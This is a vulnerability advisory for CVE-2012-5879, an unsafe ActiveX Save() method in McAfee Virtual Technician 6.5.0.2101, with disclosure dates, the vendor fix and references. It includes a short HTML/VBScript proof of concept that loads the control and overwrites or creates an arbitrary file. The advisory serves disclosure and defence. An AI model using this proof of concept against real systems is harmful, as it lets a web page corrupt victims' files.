Advisory ID: HTB23128
Product: McAfee Virtual Technician (MVT) 6.5.0.2101
Vendor: McAfee
Vulnerable Version(s): 6.5.0.2101 and probably prior
Tested Version: 6.5.0.2101 on Windows 7 SP1 and Internet Explorer 9
Vendor Notification: November 19, 2012
Vendor Patch: March 15, 2013
Public Disclosure: March 27, 2013
Vulnerability Type: Exposed Unsafe ActiveX Method [CWE-618]
CVE Reference: CVE-2012-5879
Risk Level: Medium
CVSSv2 Base Score: 5.8 (AV:N/AC:M/Au:N/C:N/I:P/A:P)
Solution Status: Fixed by Vendor
Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )

-----------------------------------------------------------------------------------------------

Advisory Details:

High-Tech Bridge Security Research Lab discovered vulnerability in McAfee Virtual Technician ActiveX control, which can be exploited by remote malicious person to overwrite arbitrary files with garbage data on a vulnerable system.


1) Insecure method in McAfee Virtual Technician ActiveX control: CVE-2012-5879

The vulnerability exists due to the ActiveX control including the insecure "Save()" method in "McHealthCheck.dll" DLL. This can be exploited to corrupt or create arbitrary files in the context of the current user.

The following PoC code is available:


<html>
<h4>McAfee Virtual Technician [McHealthCheck.dll] v.6.5.0.2101</h4>
<h5>This proof of concepts creates an arbitrary file in a system [Windows 7, SP1 with IE 9.0] by leveraging the McHealthCheck.dll ActiveX module and the method "Save()":</h5>
<object classid='clsid:24565A99-ADDA-47B9-9E86-3C4C3360E256' id='target'></object>
<input type="button" value="Boom!" language="VBScript" OnClick="CreateArbitraryFile()">

<script language="VBScript">
sub CreateArbitraryFile()
arg1="FilePath\File_name_to_corrupt_or_create"
target.Save arg1
End Sub

</script>
</html>


-----------------------------------------------------------------------------------------------

Solution:

Upgrade to McAfee Virtual Technician (MVT) 7.1
More Information:
https://kc.mcafee.com/corporate/index?page=content&id=SB10040

-----------------------------------------------------------------------------------------------

References:

[1] High-Tech Bridge Advisory HTB23128 - https://www.htbridge.com/advisory/HTB23128 - McAfee Virtual Technician ActiveX control Insecure Method.
[2] McAfee Virtual Technician - mvt.mcafee.com - McAfee Virtual Technician collects information on your computer system so that McAfee can diagnose and solve problems related to your McAfee software.
[3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVEÂ® is a dictionary of publicly known information security vulnerabilities and exposures.
[4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.

-----------------------------------------------------------------------------------------------

Disclaimer: The information provided in this Advisory is provided "as is" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.